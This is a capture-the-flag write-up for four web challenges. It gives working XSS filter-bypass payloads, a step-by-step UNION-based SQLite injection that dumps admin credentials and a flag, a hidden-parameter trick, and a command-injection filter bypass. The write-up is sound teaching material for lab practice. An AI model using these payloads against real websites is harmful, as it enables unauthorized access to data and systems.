# 1. Choosy
Description:
Single solution doesn't works on all problems. One should try different solutions for different problem.

link: http://20.193.247.209:8333/

Solution:
+ XSS detected
+ ` <image src/onerror=alert(1)>` this input gives xss
+ <script> tag is blacklisted
+ final payload:`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
+ Flag: shellctf{50oom3_P4yL0aDS_aM0ng_Maaa4nnY}

  
# 2. Extractor
  
  Description: We are under emergency. Enemy is ready with its nuclear weapon we need to activate our gaurds but chief who had password is dead. There is portal at URL below which holds key within super-user account, can you get the key and save us.
  link: http://20.125.142.38:8956/

  Solution:
  + An sql injection challenge
  + we are provided with login and register functionality.
  + When we simply inserted `' or 1=1 --+` we got the following informations dumped.<br>
   name: user<br>
   password: pass123<br>
  signature: nothing here<br>
  
 + From this we can understand that its a basic sql injection challenge.
 + So, now lets try to know how many columns are there in the database<br>
   query: `' union select 1,2,3,4 --+`<br>
   output: name:2<br>
           pass: 3<br>
          signature: 4<br>
+ Dump the sqlite version:<br>
  query:` ' union select 1,sqlite_version(),3,4 --+`<br>
  outptu: name: 3.27.2<br>
          pass:3<br>
          signature: 4<br>
  
 + Now we need to get the table names:<br>
   query: `' union select 1,group_concat(tbl_name),3,4 from sqlite_master where type='table' and tbl_name NOT LIKE 'sqlite_%' --+`<br>
   output: name: Admin, users<br>
            pass:3<br>
            signature: 4<br>
  
 + Column names of the table 'Admin':<br>
  query: `' union select 1,sql,3,4 from sqlite_master where type!='meta' and sql NOT NULL and name not like 'sqlite_%' --+`<br>
  output: name:CREATE TABLE Admins ( id INTEGER PRIMARY KEY AUTOINCREMENT, user TEXT NOT NULL, pass TEXT NOT NULL, content TEXT NOT NULL )
          pass: 3<br>
          signature: 4<br>
  
 +Now the values of the given columns: (user, pass,content)<br>
  query: `' union select 1, user,pass,content from Admins --+`<br>
  outptu: name: admin<br>
          pass: h4rd_to_gu355<br>
          signature: shellctf{Sql_1Nj3c7i0n_B45iC_XD}<br>
  
 + So, here we got the flag!
  
  
 # 3. Colour cookie
  
 Challenge description:
  Gone those days when no colours, images, fonts use to be on a webpage. We now have various ways to decorate our webpages and here is one such example.
  
link: http://20.125.142.38:8326/
 Solution:
 + When we give something in the name field, for example i gave name=ram, then the url becomes: /check?name=ram
 + When we see the title, we may think whether the challenge is about cookies, but we cant see any cookies tho!
 + Looking into the source code, there is a file named `base_cookies.css`. When we go into that file and scroll till the end, we can see this comment,/*   name="C0loR"  */
 + So, i tried giving 'C0loR' in the name field, nothing happened.
 + Then i changed the name parameter in the url to C0loR and gave the value as blue, as it is given as 'blue is my favourite color'.
 + There you got the flag: shellctf{C0ooooK13_W17h_c0ooorr3c7_Parr4m37er...}
  
 
 # 4. Illusion
  
Challenge discription: Sometimes it happens things are there but you can't see it directly. We need to change our vision to make it visible. I believe you have that vision.
link: http://20.125.142.38:8765/
  
 Solution:
 + Tried command injection, and lfi payloads nothing worked,
 + When we give cd;, we can see only the ; wll be given as output.
 + when i did, ccdd ;, it gave the output as cd ;. So, the application uses some kind of filters to avoid the common commands.
 + lets try: `ccdd ....;cat flag.txt;` still didnt worked.
 + lets try: `ccdd ....;ccdd ....;cat flag.txt;`, it worked!!
  flag: shellctf{F1l73R5_C4n'T_Pr3v3N7_C0mM4nd_1nJeC71on}
  
  
  

  

